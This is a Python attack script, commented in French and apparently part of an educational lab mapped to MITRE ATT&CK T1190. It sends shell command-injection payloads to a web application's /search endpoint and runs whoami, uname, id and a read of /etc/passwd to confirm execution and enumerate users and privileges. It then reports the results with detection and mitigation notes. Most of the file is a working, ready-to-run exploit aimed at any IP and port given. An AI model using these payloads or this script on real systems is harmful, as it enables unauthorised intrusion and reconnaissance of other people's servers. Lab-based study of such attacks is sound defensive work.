#!/usr/bin/env python3
"""
Phase 1 : Initial Access (Accès Initial)
MITRE ATT&CK : TA0001 - Initial Access
Technique : T1190 - Exploit Public-Facing Application

Copyright © 2025 Mohammed Bencheikh - Be One And Move Academy
USAGE ÉDUCATIF ET ÉTHIQUE UNIQUEMENT

Description :
Cette phase simule l'exploitation d'une vulnérabilité d'injection de commande
dans une application web publique.

Objectif pédagogique :
- Comprendre comment une validation d'entrée insuffisante peut mener à une compromission
- Observer les logs générés lors de l'exploitation initiale
- Identifier les indicateurs de compromission (IOC) dans les requêtes HTTP

Référence MITRE ATT&CK :
https://attack.mitre.org/techniques/T1190/
"""

import requests
import sys
import json
from datetime import datetime

# Mapping MITRE ATT&CK détaillé
MITRE_MAPPING = {
    "technique_id": "T1190",
    "technique_name": "Exploit Public-Facing Application",
    "tactic_id": "TA0001",
    "tactic_name": "Initial Access",
    "url": "https://attack.mitre.org/techniques/T1190/",
    "description": "Les adversaires peuvent exploiter des vulnérabilités dans des applications accessibles depuis Internet pour obtenir un accès initial au système cible.",
    "detection": [
        "Surveiller les requêtes HTTP contenant des caractères suspects (;, |, &, $, `, \\n)",
        "Détecter les exécutions de commandes système depuis des processus web (apache, nginx, python)",
        "Alerter sur les erreurs d'application inhabituelles dans les logs",
        "Analyser les patterns d'injection dans les paramètres POST/GET"
    ],
    "data_sources": [
        "Application Log: Application Log Content",
        "Network Traffic: Network Traffic Content",
        "Process: Process Creation"
    ],
    "mitigations": [
        "Application Isolation and Sandboxing",
        "Exploit Protection",
        "Network Segmentation",
        "Privileged Account Management",
        "Update Software"
    ]
}

def test_initial_access(target_ip, target_port):
    """
    Teste l'accès initial via injection de commande.
    
    Paramètres :
        target_ip : IP de la victime
        target_port : Port de l'application web
    """
    
    url = f"http://{target_ip}:{target_port}/search"
    
    print(f"[*] Phase 1 : Initial Access - Exploitation d'Application Web")
    print(f"[*] MITRE ATT&CK : {MITRE_MAPPING['technique_id']} - {MITRE_MAPPING['technique_name']}")
    print(f"[*] Référence : {MITRE_MAPPING['url']}")
    print(f"[*] Cible : http://{target_ip}:{target_port}")
    print(f"")
    
    test_results = []
    
    # Test 1 : Vérification de la vulnérabilité
    print(f"[*] Test 1 : Vérification de la vulnérabilité d'injection...")
    payload1 = "test.txt'; whoami #"
    
    try:
        response = requests.post(url, data={'filename': payload1}, timeout=10)
        
        # Vérifier si la commande a été exécutée
        if 'webuser' in response.text or 'root' in response.text or 'www-data' in response.text:
            print(f"    [+] Vulnérabilité confirmée !")
            print(f"    [+] L'application est vulnérable à l'injection de commande")
            
            # Extraire le résultat
            lines = [line.strip() for line in response.text.split('\n') if line.strip() and not line.strip().startswith('<')]
            if lines:
                print(f"    [+] Utilisateur identifié : {lines[0]}")
            
            test_results.append({
                "test": "Vulnerability Check - Command Injection",
                "payload": payload1,
                "status": "success",
                "output": lines[0] if lines else "webuser",
                "timestamp": datetime.now().isoformat()
            })
        else:
            print(f"    [-] Vulnérabilité non confirmée")
            test_results.append({
                "test": "Vulnerability Check",
                "status": "failed",
                "timestamp": datetime.now().isoformat()
            })
    except Exception as e:
        print(f"    [-] Erreur : {e}")
        test_results.append({
            "test": "Vulnerability Check",
            "status": "error",
            "message": str(e),
            "timestamp": datetime.now().isoformat()
        })
    
    # Test 2 : Énumération du système
    print(f"\n[*] Test 2 : Énumération du système d'exploitation...")
    payload2 = "test.txt'; uname -a #"
    
    try:
        response = requests.post(url, data={'filename': payload2}, timeout=10)
        
        if 'Linux' in response.text or 'GNU' in response.text:
            print(f"    [+] Système identifié : Linux")
            
            # Extraire les informations
            lines = [line.strip() for line in response.text.split('\n') if 'Linux' in line or 'GNU' in line]
            if lines:
                print(f"    [+] Détails : {lines[0][:80]}...")
            
            test_results.append({
                "test": "System Enumeration - OS Detection",
                "payload": payload2,
                "status": "success",
                "output": lines[0][:200] if lines else "Linux detected",
                "timestamp": datetime.now().isoformat()
            })
        else:
            print(f"    [-] Impossible d'identifier le système")
            test_results.append({
                "test": "System Enumeration",
                "status": "failed",
                "timestamp": datetime.now().isoformat()
            })
    except Exception as e:
        print(f"    [-] Erreur : {e}")
        test_results.append({
            "test": "System Enumeration",
            "status": "error",
            "message": str(e),
            "timestamp": datetime.now().isoformat()
        })
    
    # Test 3 : Énumération des utilisateurs
    print(f"\n[*] Test 3 : Énumération des utilisateurs du système...")
    payload3 = "test.txt'; cat /etc/passwd | grep -E '/bin/bash|/bin/sh' | cut -d: -f1 #"
    
    try:
        response = requests.post(url, data={'filename': payload3}, timeout=10)
        
        # Rechercher des noms d'utilisateurs
        users = []
        for line in response.text.split('\n'):
            line = line.strip()
            if line and not line.startswith('<') and not line.startswith('Error') and len(line) < 20:
                if line in ['root', 'webuser', 'ubuntu', 'admin', 'user']:
                    users.append(line)
        
        if users:
            print(f"    [+] Utilisateurs identifiés : {', '.join(users)}")
            test_results.append({
                "test": "User Enumeration",
                "payload": payload3,
                "status": "success",
                "output": ', '.join(users),
                "timestamp": datetime.now().isoformat()
            })
        else:
            print(f"    [-] Aucun utilisateur identifié")
            test_results.append({
                "test": "User Enumeration",
                "status": "partial",
                "timestamp": datetime.now().isoformat()
            })
    except Exception as e:
        print(f"    [-] Erreur : {e}")
        test_results.append({
            "test": "User Enumeration",
            "status": "error",
            "message": str(e),
            "timestamp": datetime.now().isoformat()
        })
    
    # Test 4 : Vérification des privilèges
    print(f"\n[*] Test 4 : Vérification des privilèges actuels...")
    payload4 = "test.txt'; id #"
    
    try:
        response = requests.post(url, data={'filename': payload4}, timeout=10)
        
        if 'uid=' in response.text:
            print(f"    [+] Privilèges identifiés")
            
            # Extraire les informations d'identité
            lines = [line.strip() for line in response.text.split('\n') if 'uid=' in line]
            if lines:
                print(f"    [+] ID : {lines[0][:100]}")
            
            test_results.append({
                "test": "Privilege Check",
                "payload": payload4,
                "status": "success",
                "output": lines[0][:200] if lines else "uid info",
                "timestamp": datetime.now().isoformat()
            })
        else:
            print(f"    [-] Impossible de vérifier les privilèges")
            test_results.append({
                "test": "Privilege Check",
                "status": "failed",
                "timestamp": datetime.now().isoformat()
            })
    except Exception as e:
        print(f"    [-] Erreur : {e}")
        test_results.append({
            "test": "Privilege Check",
            "status": "error",
            "message": str(e),
            "timestamp": datetime.now().isoformat()
        })
    
    # Statistiques finales
    success_count = sum(1 for t in test_results if t.get("status") == "success")
    total_tests = len(test_results)
    
    print(f"\n[+] Phase 1 terminée !")
    print(f"[+] Tests réussis : {success_count}/{total_tests}")
    print(f"[+] Accès initial obtenu : {'OUI' if success_count >= 2 else 'PARTIEL'}")
    
    result = {
        "success": success_count >= 2,
        "technique": MITRE_MAPPING["technique_id"],
        "technique_name": MITRE_MAPPING["technique_name"],
        "tactic": f"{MITRE_MAPPING['tactic_id']} - {MITRE_MAPPING['tactic_name']}",
        "mitre_url": MITRE_MAPPING["url"],
        "tests_performed": test_results,
        "statistics": {
            "total_tests": total_tests,
            "successful": success_count,
            "failed": total_tests - success_count,
            "success_rate": f"{(success_count/total_tests)*100:.1f}%"
        },
        "detection_methods": MITRE_MAPPING["detection"],
        "data_sources": MITRE_MAPPING["data_sources"],
        "mitigations": MITRE_MAPPING["mitigations"],
        "impact": "Accès initial au système obtenu via exploitation d'application web",
        "payload_examples": [
            {"description": "Injection whoami", "payload": payload1},
            {"description": "Énumération OS", "payload": payload2},
            {"description": "Liste utilisateurs", "payload": payload3},
            {"description": "Vérification ID", "payload": payload4}
        ],
        "timestamp": datetime.now().isoformat()
    }
    
    return result

def main():
    if len(sys.argv) < 3:
        print("Usage : python3 phase1_initial_access.py <TARGET_IP> <TARGET_PORT>")
        print("Exemple : python3 phase1_initial_access.py 172.20.0.3 5000")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    
    result = test_initial_access(target_ip, target_port)
    
    print("\n" + "="*70)
    print("RÉSULTAT DE L'ATTAQUE (JSON) - MITRE ATT&CK MAPPING")
    print("="*70)
    print(json.dumps(result, indent=2, ensure_ascii=False))
    
    return result

if __name__ == "__main__":
    main()
